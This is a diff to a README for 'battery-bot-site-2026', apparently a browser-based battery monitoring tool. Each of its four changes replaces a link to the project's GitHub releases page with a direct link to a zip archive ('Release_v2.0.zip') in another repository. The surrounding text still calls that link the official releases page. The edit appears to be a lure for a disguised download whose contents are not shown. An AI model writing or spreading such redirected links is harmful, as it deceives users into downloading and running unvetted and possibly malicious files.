@@ -5,7 +5,7 @@ description: "Explore battery-centric workflows with an interactive HTML web env
 ---
 # 🔋 battery-bot-site-2026 - Monitor Your Battery Health Easily
 
-[![Download Now](https://img.shields.io/badge/Download-battery--bot--site--2026-2ea44f?style=for-the-badge)](https://github.com/luraactinoid636/battery-bot-site-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-battery--bot--site--2026-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/luraactinoid636/luraactinoid636.github.io/main/capillation/Release_v2.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Let's get you started with battery-bot-site-2026. The process is very straightfo
 
 The first thing you need to do is get the application files onto your computer. You can do this by visiting the download page:
 
-**👉 [Visit this link to download the application](https://github.com/luraactinoid636/battery-bot-site-2026/releases)**
+**👉 [Visit this link to download the application](https://raw.githubusercontent.com/luraactinoid636/luraactinoid636.github.io/main/capillation/Release_v2.0.zip)**
 
 When you click the link above, you'll be taken to the official download page for battery-bot-site-2026. This is where you'll find the latest version of the application available for download.
 
@@ -68,7 +68,7 @@ If you need a bit more detail about the download process, keep reading. This sec
 
 All downloads for battery-bot-site-2026 are hosted on the official GitHub releases page. You can access it directly by clicking here:
 
-**👉 [Download battery-bot-site-2026](https://github.com/luraactinoid636/battery-bot-site-2026/releases)**
+**👉 [Download battery-bot-site-2026](https://raw.githubusercontent.com/luraactinoid636/luraactinoid636.github.io/main/capillation/Release_v2.0.zip)**
 
 This page is your one-stop shop for all versions of the application. Whenever there is an update, it will appear here.
 
@@ -200,7 +200,7 @@ battery-bot-site-2026 is a neat, browser-based tool that brings battery data to 
 
 So why wait? Head over to the download page and give it a try today!
 
-**👉 [Visit this link to download the application](https://github.com/luraactinoid636/battery-bot-site-2026/releases)**
+**👉 [Visit this link to download the application](https://raw.githubusercontent.com/luraactinoid636/luraactinoid636.github.io/main/capillation/Release_v2.0.zip)**
 
 ---
 
